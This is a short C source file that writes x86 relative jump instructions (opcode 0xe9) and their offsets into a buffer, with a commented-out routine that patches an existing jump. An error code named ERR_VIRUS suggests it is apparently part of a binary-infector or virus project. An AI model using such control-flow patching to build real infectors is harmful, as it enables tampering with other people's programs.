
#include <stdint.h>
#include <stdbool.h>
#include "disasm.h"
#include "bytes.h"

void		write_jump_arg(void *arg, int32_t value, uint8_t value_size)
{
	if (value_size == DWORD)     *(int32_t*)arg = (int32_t)(value);
	else if (value_size == WORD) *(int16_t*)arg = (int16_t)(value);
	else if (value_size == BYTE) *(int8_t*)arg  = (int8_t)(value);
}

bool		write_jump(void *buffer, int32_t value, uint8_t value_size)
{
	uint8_t	*opcode = (uint8_t*)(buffer);
	int32_t	*arg    = (int32_t*)(buffer + 1);

	*opcode = 0xe9;
	write_jump_arg(arg, value, value_size);

	return true;
}

// void		write_trailing_jump(void *buffer, int32_t value)
// {
// 	uint8_t	*opcode = (uint8_t*)(buffer);
// 	int32_t	*arg    = (int32_t*)(buffer + 1);
//
// 	*opcode = 0xe9;
// 	*arg    = value;
// }
//
// bool		assign_jump32(void *jump_inst, int32_t rel)
// {
// 	size_t	len  = disasm_length(jump_inst, INSTRUCTION_MAXLEN);
// #ifdef DEBUG
// 	if (len < 5)
// 		return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
// #endif
// 	int32_t	*arg = jump_inst + len - sizeof(int32_t);
//
// 	// deduct len since rel addressing is from the end of jump instruction
// 	*arg = rel - len;
// 	return true;
// }
